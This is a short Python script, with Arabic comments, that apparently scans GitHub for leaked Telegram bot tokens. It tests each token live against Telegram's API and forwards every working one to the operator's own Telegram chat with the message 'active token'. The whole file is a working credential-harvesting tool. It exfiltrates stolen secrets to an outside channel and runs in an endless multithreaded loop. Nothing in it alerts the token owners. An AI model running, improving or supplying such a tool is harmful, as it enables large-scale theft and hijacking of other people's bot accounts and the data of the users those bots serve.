import os
import requests
import threading
from scanner import search_for_tokens

GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')

def process_token(token):
    # تحقق فوري ومباشر
    check_url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        response = requests.get(check_url, timeout=5)
        if response.status_code == 200:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": CHAT_ID, "text": f"🔥 توكن فعال:\n`{token}`", "parse_mode": "Markdown"}
            requests.post(url, data=payload)
    except:
        pass

def main():
    print("Zero Engine: Hyper-Speed Scanner Activated...")
    while True:
        # الحصول على دفعات من التوكنات
        tokens = search_for_tokens(GITHUB_TOKEN)
        # تشغيل فحص كل توكن في خيط منفصل (Thread) لتسريع الإرسال
        for token in tokens:
            threading.Thread(target=process_token, args=(token,)).start()

if __name__ == "__main__":
    main()
